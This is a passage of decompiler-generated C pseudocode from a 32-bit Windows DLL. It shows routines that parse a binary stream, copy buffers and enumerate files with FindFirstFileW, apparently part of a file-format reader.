      v9 = (*(int (__thiscall **)(_DWORD *, char *))(*v4 + 48))(v4, i);
      sub_10001236((LONG *)(v9 + 8), &v15);
      v16 = *(_DWORD *)(v9 + 12);
      sub_10040853(v12, &v19, (int)&v14, v16);
    }
    sub_1000B36F(v12, (int)a2);
    v18 = 1;
    LOBYTE(v22) = 1;
    sub_1000522C(&v13);
    LOBYTE(v22) = 0;
    sub_1000B3DF(v12);
  }
  else
  {
    sub_1000B1F3(0, (int)a2, 0);
    v22 = 0;
    v18 = 1;
  }
  return a2;
}
// 100407B1: variable 'v7' is possibly undefined

//----- (10040853) --------------------------------------------------------
unsigned int __userpurge sub_10040853@<eax>(_DWORD *a1@<ebx>, _DWORD *a2@<esi>, int a3, int Src)
{
  int v4; // ecx
  size_t v5; // edi
  unsigned int result; // eax
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  const void *v10; // [esp-8h] [ebp-Ch]

  v5 = 2 * sub_1000D687(a3) + 2;
  result = *a2 + v5 + 4;
  if ( a1[3] >= result )
  {
    v7 = sub_1000B49B(a1, v4);
    memcpy((void *)(*a2 + v7), &Src, 4u);
    *a2 += 4;
    v10 = *(const void **)(*(_DWORD *)(a3 + 4) + 12);
    v9 = sub_1000B49B(a1, v8);
    memcpy((void *)(*a2 + v9), v10, v5);
    *a2 += v5;
    result = a1[1];
    *(_BYTE *)(result + 8) = 1;
  }
  return result;
}
// 10040875: variable 'v4' is possibly undefined
// 10040896: variable 'v8' is possibly undefined

//----- (100408B3) --------------------------------------------------------
void __thiscall sub_100408B3(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // edi
  int v5; // eax
  unsigned int v6; // eax
  char v7; // al
  int v8; // eax
  HANDLE FirstFileW; // eax
  unsigned int i; // ebx
  _DWORD *v11; // eax
  int v12; // eax
  int v13[9]; // [esp-14h] [ebp-58h] BYREF
  int v14; // [esp+10h] [ebp-34h]
  int v15[2]; // [esp+14h] [ebp-30h] BYREF
  void *v16[2]; // [esp+1Ch] [ebp-28h] BYREF
  int v17[2]; // [esp+24h] [ebp-20h] BYREF
  LONG v18[3]; // [esp+2Ch] [ebp-18h] BYREF
  int v19; // [esp+40h] [ebp-4h]

  if ( this[3] >= 4u )
  {
    sub_10008066(v17);
    v19 = 0;
    v3 = a2;
    v4 = a2 + 728;
    v5 = *(_DWORD *)(a2 + 728);
    v14 = a2 + 728;
    (*(void (__thiscall **)(int))(v5 + 52))(a2 + 728);
    if ( *(_DWORD *)(a2 + 76) )
    {
      FindClose(*(HANDLE *)(a2 + 76));
      *(_DWORD *)(a2 + 76) = 0;
    }
    *(_DWORD *)(a2 + 712) = sub_1000B6F2(this, 0);
    v6 = this[3];
    v15[0] = 4;
    if ( v6 <= 4 )
    {
      v11 = sub_10029C7F(*(_DWORD *)(a2 + 744), v16);
      LOBYTE(v19) = 2;
      sub_10001236(v11 + 1, v18);
      LOBYTE(v19) = 0;
      sub_1000D3AD((int *)v16);
      v12 = *(_DWORD *)v4;
      v18[1] = 0;
      (*(void (__thiscall **)(int, int *))(v12 + 36))(v4, v17);
    }
    else
    {
      do
      {
        v16[0] = v13;
        sub_1000B36F(this, (int)v13);
        LOBYTE(v19) = 0;
        sub_10040AC6((int)v17, v15, v13[0], v13[1], v13[2], v13[3], v13[4]);
        if ( !v7 )
          break;
        (*(void (__thiscall **)(int, int *))(*(_DWORD *)v14 + 36))(v14, v17);
      }
      while ( v15[0] < this[3] );
      v3 = a2;
      v4 = v14;
    }
    if ( (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4) && *(_DWORD *)(v3 + 712) )
    {
      v8 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v4 + 44))(v4, 0);
      sub_10001236((LONG *)(v8 + 8), (LONG *)(v3 + 676));
      *(_DWORD *)(v3 + 716) = *(_DWORD *)((*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)v4 + 44))(v4, 0) + 12);
      (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v4 + 40))(v4, 0);
      sub_1000D17D(v16, asc_10175794);
      LOBYTE(v19) = 3;
      sub_1000D5FF(v15, v3 + 672, v16);
      LOBYTE(v19) = 5;
      sub_1000D3AD((int *)v16);
      FirstFileW = FindFirstFileW(*(LPCWSTR *)(v15[1] + 12), (LPWIN32_FIND_DATAW)(v3 + 80));
      *(_DWORD *)(v3 + 76) = FirstFileW;
      if ( FirstFileW == (HANDLE)-1 )
      {
        *(_DWORD *)(v3 + 76) = 0;
      }
      else
      {
        for ( i = 0; i < *(_DWORD *)(v3 + 712); ++i )
        {
          if ( !FindNextFileW(*(HANDLE *)(v3 + 76), (LPWIN32_FIND_DATAW)(v3 + 80)) )
            break;
        }
      }
      LOBYTE(v19) = 0;
      sub_1000D3AD(v15);
    }
    v19 = -1;
    sub_1000522C(v17);
  }
}
// 1004096A: variable 'v7' is possibly undefined

//----- (10040AC6) --------------------------------------------------------
void __userpurge sub_10040AC6(int a1@<edi>, int *a2@<esi>, int a3, int a4, int a5, unsigned int a6, int a7)
{
  int v7; // eax
  size_t v8; // ebx
  int v9; // eax
  int v10; // edx
  size_t v11; // ebx
  int v12; // [esp+10h] [ebp-22Ch] BYREF
  LONG v13; // [esp+14h] [ebp-228h] BYREF
  wchar_t String[272]; // [esp+18h] [ebp-224h] BYREF
  int v15; // [esp+238h] [ebp-4h]

  v15 = 0;
  if ( a2 )
  {
    if ( a6 > *a2 )
    {
      v7 = sub_1000B6F2(&a3, *a2);
      String[0] = 0;
      v8 = 520;
      *(_DWORD *)(a1 + 12) = v7;
      *a2 += 4;
      memset(&String[1], 0, 0x208u);
      if ( a6 - *a2 <= 0x208 )
        v8 = a6 - *a2;
      v9 = sub_1000B4B8(&a3);
      memcpy(String, (const void *)(v10 + v9), v8);
      sub_1000D17D(&v12, String);
      LOBYTE(v15) = 1;
      sub_1000E111((int)&v12);
      v11 = 2 * sub_1000D687((int)&v12) + 2;
      sub_10001236(&v13, (LONG *)(a1 + 8));
      *a2 += v11;
      LOBYTE(v15) = 0;
      sub_1000D3AD(&v12);
    }
    v15 = -1;
    sub_1000B3DF(&a3);
  }
  else
  {
    v15 = -1;
    sub_1000B3DF(&a3);
  }
  sub_1009FFBF();
}
// 10040B52: variable 'v10' is possibly undefined

//----- (10040BB5) --------------------------------------------------------
_DWORD *__stdcall sub_10040BB5(_DWORD *a1, int a2)
{
  sub_10040C29(a1);
  *a1 = &off_10103F58;
  a1[1] = a2;
  return a1;
}
// 10103F58: using guessed type int (__thiscall *off_10103F58)(void *Block, char);

//----- (10040BE8) --------------------------------------------------------
void __thiscall sub_10040BE8(_DWORD *this)
{
  *this = &off_10103F58;
  sub_10040C5B(this);
}
// 10103F58: using guessed type int (__thiscall *off_10103F58)(void *Block, char);

//----- (10040C0D) --------------------------------------------------------
_DWORD *__thiscall sub_10040C0D(_DWORD *Block, char a2)
{
  sub_10040BE8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10040C29) --------------------------------------------------------
_DWORD *__stdcall sub_10040C29(_DWORD *a1)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_10103F48;
  return a1;
}
// 10103F48: using guessed type int (__thiscall *off_10103F48)(void *Block, char);

//----- (10040C5B) --------------------------------------------------------
void __stdcall sub_10040C5B(_DWORD *a1)
{
  sub_1000E843(a1);
}

//----- (10040C7B) --------------------------------------------------------
_DWORD *__thiscall sub_10040C7B(_DWORD *Block, char a2)
{
  sub_10040C5B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10040C98) --------------------------------------------------------
_DWORD *__stdcall sub_10040C98(_DWORD *a1)
{
  sub_10040C29(a1);
  a1[1] = 0;
  *a1 = &off_10103F58;
  return a1;
}
// 10103F58: using guessed type int (__thiscall *off_10103F58)(void *Block, char);

//----- (10040CC9) --------------------------------------------------------
_DWORD *__stdcall sub_10040CC9(_DWORD *a1, int a2, int a3)
{
  void **v3; // edi
  _DWORD *v4; // eax
  int v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v9; // [esp-8h] [ebp-2Ch] BYREF
  int v10; // [esp-4h] [ebp-28h]
  void *v11; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v13; // [esp+20h] [ebp-4h]

  v13 = 0;
  v10 = 4;
  *a1 = &off_10103F60;
  v3 = (void **)(a1 + 1);
  v4 = operator new(v10);
  Block = v4;
  LOBYTE(v13) = 1;
  if ( v4 )
    *v4 = 1;
  else
    v4 = 0;
  *v3 = 0;
  a1[2] = v4;
  Block = operator new(0x14u);
  LOBYTE(v13) = 3;
  if ( Block )
  {
    v9 = v10;
    v11 = &v9;
    sub_1000D372(&v9, (int)&a2);
    LOBYTE(v13) = 3;
    v5 = sub_1001187B((int)Block, v9, v10);
  }
  else
  {
    v5 = 0;
  }
  LOBYTE(v13) = 2;
  sub_10050B91(a1 + 3, v5);
  LOBYTE(v13) = 5;
  v6 = operator new(0x40u);
  v11 = v6;
  LOBYTE(v13) = 6;
  if ( v6 )
    Block = sub_1004C8FA((void *)a1[3], v6);
  else
    Block = 0;
  LOBYTE(v13) = 5;
  if ( *v3 != Block )
  {
    sub_10040447((int)(a1 + 1));
    v7 = operator new(4u);
    v11 = v7;
    LOBYTE(v13) = 7;
    if ( v7 )
      *v7 = 1;
    else
      v7 = 0;
    LOBYTE(v13) = 5;
    a1[2] = v7;
    *v3 = Block;
  }
  v13 = -1;
  sub_1000D3AD(&a2);
  return a1;
}
// 10103F60: using guessed type int (__thiscall *off_10103F60)(void *Block, char);

//----- (10040DCE) --------------------------------------------------------
_DWORD *__thiscall sub_10040DCE(_DWORD *Block, char a2)
{
  sub_10040DEA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10040DEA) --------------------------------------------------------
void __thiscall sub_10040DEA(_DWORD *this)
{
  *this = &off_10103F60;
  sub_10020B81(this + 3);
  sub_10044C74(this + 1);
}
// 10103F60: using guessed type int (__thiscall *off_10103F60)(void *Block, char);

//----- (10040E1F) --------------------------------------------------------
_DWORD *__stdcall sub_10040E1F(int a1, _DWORD *a2, int a3, _DWORD *a4)
{
  _DWORD *v4; // ebx
  _DWORD *v5; // eax
  int v6; // edi
  int *v7; // eax
  DWORD LastError; // eax
  _DWORD *v9; // eax
  _DWORD v11[4]; // [esp+10h] [ebp-60h] BYREF
  int v12; // [esp+20h] [ebp-50h]
  void *v13; // [esp+24h] [ebp-4Ch]
  int v14; // [esp+28h] [ebp-48h]
  _DWORD v15[4]; // [esp+2Ch] [ebp-44h] BYREF
  void *v16[4]; // [esp+3Ch] [ebp-34h] BYREF
  int v17; // [esp+54h] [ebp-1Ch] BYREF
  unsigned int v18; // [esp+58h] [ebp-18h]
  char v19; // [esp+5Eh] [ebp-12h]
  char v20; // [esp+5Fh] [ebp-11h]
  int v21; // [esp+6Ch] [ebp-4h]

  v4 = a2;
  v18 = 13;
  if ( !a4 )
  {
    v5 = sub_1000E7F7(&a2, 1, 0);
    v21 = 0;
    goto LABEL_3;
  }
  v6 = a3;
  if ( *(_DWORD *)(a3 + 12) <= 0xDu )
  {
    v5 = sub_1000E7F7(&a2, 1, 0);
    v21 = 1;
LABEL_3:
    sub_10007882((int)v5);
  }
  *a4 = 0;
  *v4 = 203;
  v4[1] = 0;
  v4[1] = GetLastError();
  v19 = *(_BYTE *)(*(_DWORD *)(v6 + 4) + 8);
  v20 = 0;
  v21 = 2;
  sub_10041019(a1);
  sub_100411F4(a1, v11);
  LOBYTE(v21) = 3;
  sub_10037CF0(v11, (int)v16);
  LOBYTE(v21) = 4;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v16[0] + 4))(v16[0]) && !v20 )
  {
    v7 = (int *)(*(int (__thiscall **)(void *))(*(_DWORD *)v16[0] + 12))(v16[0]);
    v12 = *v7;
    v13 = (void *)v7[1];
    v14 = v7[2];
    if ( (_BYTE)v12 == 2 )
    {
      v15[2] = 4;
      LastError = GetLastError();
      *v4 = 4;
      v4[1] = LastError;
      v16[3] = 0;
      v16[2] = v13;
      (*(void (__thiscall **)(_DWORD, void *, _DWORD))(**(_DWORD **)(a1 + 4) + 52))(*(_DWORD *)(a1 + 4), v13, 0);
      v17 = 0;
      v9 = sub_10041417(a1, v15, a3, v18, &v17);
      *v4 = *v9;
      v4[1] = v9[1];
      v18 += v17;
      *a4 += v17;
      if ( *v4 )
        break;
      if ( v4[1] == 2 )
        v20 = 1;
    }
    sub_10042AAB((int)v16[0]);
  }
  LOBYTE(v21) = 3;
  sub_1003406C(v16);
  LOBYTE(v21) = 2;
  sub_10042882(v11);
  v21 = -1;
  if ( v19 )
    *(_BYTE *)(*(_DWORD *)(a3 + 4) + 8) = 1;
  return v4;
}
// 10040E1F: using guessed type _DWORD var_60[4];

//----- (10041019) --------------------------------------------------------
void __stdcall sub_10041019(int a1)
{
  int v1; // ecx
  _DWORD *v2; // eax
  int v3; // ecx
  _DWORD *v4; // eax
  int v5; // ecx
  _DWORD *v6; // eax
  bool v7; // [esp+17h] [ebp-45h]
  int (__thiscall **v8)(void *, char); // [esp+18h] [ebp-44h] BYREF
  int pExceptionObject[2]; // [esp+1Ch] [ebp-40h] BYREF
  void *v10[5]; // [esp+24h] [ebp-38h] BYREF
  void *v11[6]; // [esp+38h] [ebp-24h] BYREF
  int v12; // [esp+58h] [ebp-4h]

  pExceptionObject[1] = 0;
  (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD))(**(_DWORD **)(a1 + 4) + 52))(*(_DWORD *)(a1 + 4), 0, 0);
  sub_1000B1F3((void *)dword_10186CE0, (int)v11, 0);
  v12 = 0;
  sub_1000B79B(v1, v11);
  sub_10041333(v11, a1);
  v2 = sub_1000D2FA(pExceptionObject, 0);
  LOBYTE(v12) = 1;
  v7 = sub_1000D65C((int)&unk_10186CE4, (int)v2) != 0;
  LOBYTE(v12) = 0;
  sub_1000D3AD(pExceptionObject);
  if ( v7 )
  {
    sub_10040C29(&v8);
    v8 = &off_10103F50;
    LOBYTE(v12) = 3;
    Concurrency::details::ThreadScheduler::ThreadScheduler(
      (Concurrency::details::ThreadScheduler *)pExceptionObject,
      (const struct Concurrency::SchedulerPolicy *)&v8);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVHzimnwhCawLjletbqhz_BurqUpfqufhkrx_wvnem__);
  }
  sub_1000B1F3((void *)2, (int)v10, 0);
  LOBYTE(v12) = 4;
  sub_1000B79B(v3, v10);
  sub_10041333(v10, a1);
  v4 = sub_1000D2FA(pExceptionObject, 0);
  LOBYTE(v12) = 5;
  *(_BYTE *)(a1 + 20) = StrToIntW(*(PCWSTR *)(v4[1] + 12));
  LOBYTE(v12) = 4;
  sub_1000D3AD(pExceptionObject);
  v5 = 0;
  while ( dword_100FF69C[v5] != *(unsigned __int8 *)(a1 + 20) )
  {
    if ( (unsigned int)++v5 >= 4 )
    {
      v6 = sub_10040BB5(pExceptionObject, *(unsigned __int8 *)(a1 + 20));
      LOBYTE(v12) = 6;
      sub_10042D3D((int)v6, 184);
    }
  }
  LOBYTE(v12) = 0;
  sub_1000B3DF((int *)v10);
  v12 = -1;
  sub_1000B3DF((int *)v11);
}
// 1004107C: variable 'v1' is possibly undefined
// 10041118: variable 'v3' is possibly undefined
// 100FF69C: using guessed type int dword_100FF69C[];
// 10103F50: using guessed type int (__thiscall *off_10103F50)(void *Block, char);
// 10186CE0: using guessed type int dword_10186CE0;

//----- (100411B9) --------------------------------------------------------
void __thiscall sub_100411B9(_DWORD *this)
{
  sub_10040C5B(this);
}

//----- (100411D8) --------------------------------------------------------
_DWORD *__thiscall sub_100411D8(_DWORD *Block, char a2)
{
  sub_100411B9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100411F4) --------------------------------------------------------
_DWORD *__stdcall sub_100411F4(int a1, _DWORD *a2)
{
  int v2; // ecx
  const void *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // esi
  int v6; // ecx
  int v7; // ecx
  void *v9; // [esp-4h] [ebp-64h]
  void *v10[5]; // [esp+10h] [ebp-50h] BYREF
  void *v11[5]; // [esp+24h] [ebp-3Ch] BYREF
  char v12[4]; // [esp+38h] [ebp-28h] BYREF
  int v13; // [esp+3Ch] [ebp-24h]
  int v14; // [esp+40h] [ebp-20h]
  int v15; // [esp+44h] [ebp-1Ch]
  int v16; // [esp+48h] [ebp-18h] BYREF
  unsigned int v17; // [esp+4Ch] [ebp-14h]
  unsigned int v18[3]; // [esp+50h] [ebp-10h] BYREF
  int v19; // [esp+5Ch] [ebp-4h]

  v19 = 0;
  v15 = 0;
  (*(void (__thiscall **)(_DWORD, int, _DWORD))(**(_DWORD **)(a1 + 4) + 52))(*(_DWORD *)(a1 + 4), 21, 0);
  sub_1000B1F3((void *)4, (int)v11, 0);
  v19 = 1;
  sub_1000B79B(v2, v11);
  sub_10041333(v11, a1);
  v9 = v11[3];
  v18[0] = 0;
  v3 = (const void *)sub_1000B4B8(v11);
  memcpy(v18, v3, (size_t)v9);
  if ( v18[0] > 0xA )
  {
    v4 = sub_10040C98(&v16);
    LOBYTE(v19) = 2;
    sub_10042D5F((int)v4, 219);
  }
  v5 = a2;
  *a2 = off_100FBF5C;
  *a2 = &off_10103F68;
  a2[1] = 0;
  a2[2] = 0;
  a2[3] = 0;
  LOBYTE(v19) = 1;
  v15 = 1;
  v17 = 0;
  if ( v18[0] )
  {
    do
    {
      sub_1000B1F3((void *)1, (int)v10, 0);
      LOBYTE(v19) = 5;
      sub_1000B79B(v6, v10);
      v12[0] = 0;
      v13 = 0;
      v14 = 0;
      sub_10041333(v10, a1);
      v12[0] = *(_BYTE *)sub_1000B4CB((int)v10, v7, 0);
      v13 = sub_100413C6(a1);
      v14 = sub_100413C6(a1);
      sub_10034F16(a2, (int)v12);
      LOBYTE(v19) = 1;
      sub_1000B3DF((int *)v10);
      ++v17;
    }
    while ( v17 < v18[0] );
    v5 = a2;
  }
  LOBYTE(v19) = 0;
  sub_1000B3DF((int *)v11);
  return v5;
}
// 10041235: variable 'v2' is possibly undefined
// 100412BB: variable 'v6' is possibly undefined
// 100412D9: variable 'v7' is possibly undefined
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103F68: using guessed type int (__thiscall *off_10103F68)(void *Block, char);
// 100411F4: using guessed type unsigned int var_10[3];
// 100411F4: using guessed type char var_28[4];

//----- (10041333) --------------------------------------------------------
void __thiscall sub_10041333(void **this, int a2)
{
  _DWORD *v3; // eax
  int v4; // ebx
  int v5; // eax
  LONG v6[5]; // [esp+10h] [ebp-2Ch] BYREF
  char v7[20]; // [esp+24h] [ebp-18h] BYREF
  int v8; // [esp+38h] [ebp-4h]

  if ( !this )
  {
    v3 = sub_1000E7F7(&a2, 1, 0);
    v8 = 0;
    sub_10007882((int)v3);
  }
  sub_1000B1F3(this[3], (int)v6, 0);
  v8 = 1;
  v4 = 8 * (_DWORD)this[3];
  if ( v4 != (*(int (__thiscall **)(_DWORD, LONG *, int, _DWORD))(**(_DWORD **)(a2 + 4) + 64))(
               *(_DWORD *)(a2 + 4),
               v6,
               v4,
               0) )
  {
    v5 = sub_1000E88D((int)v7, 1, 0);
    LOBYTE(v8) = 2;
    sub_10012582(v5, 250);
  }
  sub_1000B3BD(v6, (int)this);
  v8 = -1;
  sub_1000B3DF(v6);
}
// 10041333: using guessed type LONG var_2C[5];
// 10041333: using guessed type char var_18[20];

//----- (100413C6) --------------------------------------------------------
int __stdcall sub_100413C6(int a1)
{
  int v1; // ecx
  int v2; // esi
  void *v4[7]; // [esp+10h] [ebp-20h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  sub_1000B1F3((void *)4, (int)v4, 0);
  v5 = 0;
  sub_1000B79B(v1, v4);
  sub_10041333(v4, a1);
  v2 = sub_1000B6F2(v4, 0);
  v5 = -1;
  sub_1000B3DF((int *)v4);
  return v2;
}
// 100413E7: variable 'v1' is possibly undefined

//----- (10041417) --------------------------------------------------------
_DWORD *__stdcall sub_10041417(int a1, _DWORD *a2, int a3, unsigned int a4, _DWORD *a5)
{
  _DWORD *v5; // eax
  int v6; // esi
  char v7; // bl
  unsigned __int16 v8; // ax
  char *v9; // edx
  int *v10; // ecx
  int v11; // eax
  unsigned int *v12; // eax
  int v13; // eax
  int v14; // ecx
  int v15; // ebx
  __int16 v16; // di
  LONG *v17; // eax
  char *v18; // ecx
  LONG *v19; // eax
  int v20; // edi
  size_t v21; // eax
  _DWORD *v22; // edx
  int v23; // ecx
  int v24; // eax
  unsigned __int16 v25; // di
  _DWORD *result; // eax
  int v27; // eax
  const void *v28; // [esp+2h] [ebp-94h]
  int v29; // [esp+6h] [ebp-90h]
  char v30; // [esp+1Ch] [ebp-7Ah]
  char v31; // [esp+1Dh] [ebp-79h]
  int v32; // [esp+1Eh] [ebp-78h] BYREF
  unsigned int v33; // [esp+22h] [ebp-74h]
  unsigned int v34; // [esp+26h] [ebp-70h] BYREF
  int v35; // [esp+2Ah] [ebp-6Ch]
  int v36; // [esp+2Eh] [ebp-68h]
  _DWORD v37[2]; // [esp+32h] [ebp-64h] BYREF
  char v38[8]; // [esp+3Ah] [ebp-5Ch] BYREF
  char v39[8]; // [esp+42h] [ebp-54h] BYREF
  int v40[3]; // [esp+4Ah] [ebp-4Ch] BYREF
  size_t Size; // [esp+56h] [ebp-40h]
  char v42[20]; // [esp+5Eh] [ebp-38h] BYREF
  char v43[24]; // [esp+72h] [ebp-24h] BYREF
  int v44; // [esp+92h] [ebp-4h]

  if ( a4 >= *(_DWORD *)(a3 + 12) )
  {
    v5 = sub_1000E7F7(&v34, 1, 0);
    v44 = 0;
    goto LABEL_3;
  }
  if ( !a5 )
  {
    v5 = sub_1000E7F7(&v34, 1, 0);
    v44 = 1;
LABEL_3:
    sub_10007882((int)v5);
  }
  v6 = a1;
  *a5 = 0;
  v29 = *(_DWORD *)(a1 + 4);
  v7 = 0;
  v35 = 0;
  v30 = 0;
  v36 = 0;
  v33 = 0;
  v8 = sub_1004CC0D(v29);
  v9 = v38;
LABEL_28:
  v25 = v8;
  v34 = v8
      + *(_DWORD *)(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(v6 + 4) + 56))(*(_DWORD *)(v6 + 4), v9)
      - 2;
  if ( v25 == 2 || v7 )
  {
    result = a2;
    *a2 = 0;
    a2[1] = v7 != 0 ? 2 : 0;
    return result;
  }
  v10 = *(int **)(v6 + 4);
  v11 = *v10;
  v35 = 0;
  LOBYTE(v36) = 0;
  v12 = (unsigned int *)(*(int (__thiscall **)(int *, char *))(v11 + 56))(v10, v38);
  while ( 1 )
  {
    if ( *v12 >= v34 || v7 )
    {
      sub_1004CC0D(*(_DWORD *)(v6 + 4));
      v8 = sub_1004CC0D(*(_DWORD *)(v6 + 4));
      v9 = v39;
      goto LABEL_28;
    }
    if ( v33 > 0x1B58 )
      break;
    sub_1004CAB6(*(void **)(v6 + 4));
    v13 = sub_1004CAB6(*(void **)(v6 + 4));
    v14 = *(_DWORD *)(v6 + 4);
    v35 += v13;
    (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v14 + 56))(v14, v37);
    (*(void (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(v6 + 4) + 52))(*(_DWORD *)(v6 + 4), v35, v36);
    v15 = *(_DWORD *)(v6 + 4);
    LOWORD(v32) = 0;
    v31 = 1;
    do
    {
      if ( sub_10051C21(v15, (char *)&v32, 2, 0x10u, 0) != 16 )
      {
        v27 = sub_1000E88D((int)v39, 1, 0);
        v44 = 2;
        sub_10012582(v27, 381);
      }
      if ( (v32 & 0x8000) == 0 )
        v31 = 0;
    }
    while ( v31 );
    v16 = sub_1004C98C(*(void **)(v6 + 4));
    sub_1000B1F3(0, (int)v40, 0);
    v44 = 3;
    if ( v16 == 1 )
    {
      sub_10041727((_BYTE *)v6);
      v17 = (LONG *)sub_10041953(v6, v42);
      LOBYTE(v44) = 4;
      sub_1000B3BD(v17, (int)v40);
      LOBYTE(v44) = 3;
      v18 = v42;
    }
    else
    {
      if ( v16 != 44 )
        goto LABEL_21;
      sub_10041727((_BYTE *)v6);
      v19 = (LONG *)sub_10041B96((void **)v6, v43);
      LOBYTE(v44) = 5;
      sub_1000B3BD(v19, (int)v40);
      LOBYTE(v44) = 3;
      v18 = v43;
    }
    sub_1000B3DF((int *)v18);
    v6 = a1;
LABEL_21:
    v20 = Size;
    if ( Size )
    {
      v21 = *(_DWORD *)(a3 + 12);
      if ( Size + a4 > v21 )
      {
        v30 = 1;
        v20 = v21 - a4 - ((v21 - a4) & 1);
      }
      v28 = (const void *)sub_1000B4B8(v40);
      v24 = sub_1000B49B(v22, v23);
      memcpy((void *)(a4 + v24), v28, v20);
      a4 += v20;
      *a5 += v20;
    }
    (*(void (__thiscall **)(_DWORD, _DWORD, _DWORD))(**(_DWORD **)(v6 + 4) + 52))(*(_DWORD *)(v6 + 4), v37[0], v37[1]);
    ++v33;
    v44 = -1;
    sub_1000B3DF(v40);
    v12 = (unsigned int *)(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(v6 + 4) + 56))(*(_DWORD *)(v6 + 4), v38);
    v7 = v30;
  }
  result = a2;
  *a2 = 0;
  a2[1] = 205;
  return result;
}
// 1004163D: variable 'v22' is possibly undefined
// 1004163D: variable 'v23' is possibly undefined
// 10041417: using guessed type int var_4C[3];

//----- (10041727) --------------------------------------------------------
char __thiscall sub_10041727(_BYTE *this)
{
  if ( this[20] == 15 )
    return sub_10041772((int)this);
  else
    return sub_10041869((int)this);
}
// 10041749: conditional instruction was optimized away because al.1<Cu

//----- (10041772) --------------------------------------------------------
char __usercall sub_10041772@<al>(int a1@<edi>)
{
  unsigned __int16 v1; // si
  int v2; // ecx
  const void *v3; // eax
  void *v5[5]; // [esp+14h] [ebp-24h] BYREF
  int v6[3]; // [esp+28h] [ebp-10h] BYREF
  int v7; // [esp+34h] [ebp-4h]

  sub_1004CFD6(0x20u, *(_BYTE **)(a1 + 4));
  sub_1004CF71(*(_BYTE **)(a1 + 4));
  while ( 1 )
  {
    v1 = sub_1004C98C(*(void **)(a1 + 4));
    if ( !v1 )
      break;
    sub_1004CF71(*(_BYTE **)(a1 + 4));
    sub_1004CFD6(8 * v1, *(_BYTE **)(a1 + 4));
  }
  if ( sub_1004CC71(*(void **)(a1 + 4)) )
  {
    sub_1000B1F3((void *)4, (int)v5, 0);
    v7 = 0;
    sub_1000B79B(v2, v5);
    sub_10041333(v5, a1);
    v6[0] = 0;
    v3 = (const void *)sub_1000B4B8(v5);
    memcpy(v6, v3, 4u);
    sub_1004CFD6(8 * v6[0], *(_BYTE **)(a1 + 4));
    v7 = -1;
    sub_1000B3DF((int *)v5);
  }
  sub_1004CFD6(2u, *(_BYTE **)(a1 + 4));
  sub_1004CEED(*(_BYTE **)(a1 + 4));
  sub_1004CC71(*(void **)(a1 + 4));
  sub_1004C98C(*(void **)(a1 + 4));
  sub_1004CD33(*(_BYTE **)(a1 + 4));
  sub_1004CFD6(4u, *(_BYTE **)(a1 + 4));
  sub_1004C98C(*(void **)(a1 + 4));
  return sub_1004CFD6(8u, *(_BYTE **)(a1 + 4));
}
// 100417DB: variable 'v2' is possibly undefined

//----- (10041869) --------------------------------------------------------
__int16 __usercall sub_10041869@<ax>(int a1@<edi>)
{
  unsigned __int16 v1; // si
  int v2; // ecx
  const void *v3; // eax
  void *v5[5]; // [esp+14h] [ebp-24h] BYREF
  int v6[3]; // [esp+28h] [ebp-10h] BYREF
  int v7; // [esp+34h] [ebp-4h]

  sub_1004CF71(*(_BYTE **)(a1 + 4));
  while ( 1 )
  {
    v1 = sub_1004C98C(*(void **)(a1 + 4));
    if ( !v1 )
      break;
    sub_1004CF71(*(_BYTE **)(a1 + 4));
    sub_1004CFD6(8 * v1, *(_BYTE **)(a1 + 4));
  }
  if ( sub_1004CC71(*(void **)(a1 + 4)) )
  {
    sub_1000B1F3((void *)4, (int)v5, 0);
    v7 = 0;
    sub_1000B79B(v2, v5);
    sub_10041333(v5, a1);
    v6[0] = 0;
    v3 = (const void *)sub_1000B4B8(v5);
    memcpy(v6, v3, 4u);
    sub_1004CFD6(8 * v6[0], *(_BYTE **)(a1 + 4));
    v7 = -1;
    sub_1000B3DF((int *)v5);
  }
  sub_1004CFD6(0x20u, *(_BYTE **)(a1 + 4));
  sub_1004CFD6(2u, *(_BYTE **)(a1 + 4));
  sub_1004CEED(*(_BYTE **)(a1 + 4));
  sub_1004CC71(*(void **)(a1 + 4));
  sub_1004CC71(*(void **)(a1 + 4));
  sub_1004C98C(*(void **)(a1 + 4));
  sub_1004CD33(*(_BYTE **)(a1 + 4));
  return sub_1004C98C(*(void **)(a1 + 4));
}
// 100418C7: variable 'v2' is possibly undefined

//----- (10041953) --------------------------------------------------------
void *__stdcall sub_10041953(int a1, void *a2)
{
  int v2; // edi
  unsigned __int8 v3; // al
  int v4; // esi
  _DWORD *v5; // eax
  int *v6; // ecx
  int v8; // ecx
  int v9; // ecx
  char v10; // bl
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  int v14[5]; // [esp+10h] [ebp-50h] BYREF
  void *v15[5]; // [esp+24h] [ebp-3Ch] BYREF
  int v16[2]; // [esp+38h] [ebp-28h] BYREF
  int v17[2]; // [esp+40h] [ebp-20h] BYREF
  int v18[2]; // [esp+48h] [ebp-18h] BYREF
  int v19; // [esp+50h] [ebp-10h]
  int v20; // [esp+5Ch] [ebp-4h]

  v2 = a1;
  v19 = 0;
  v3 = *(_BYTE *)(a1 + 20);
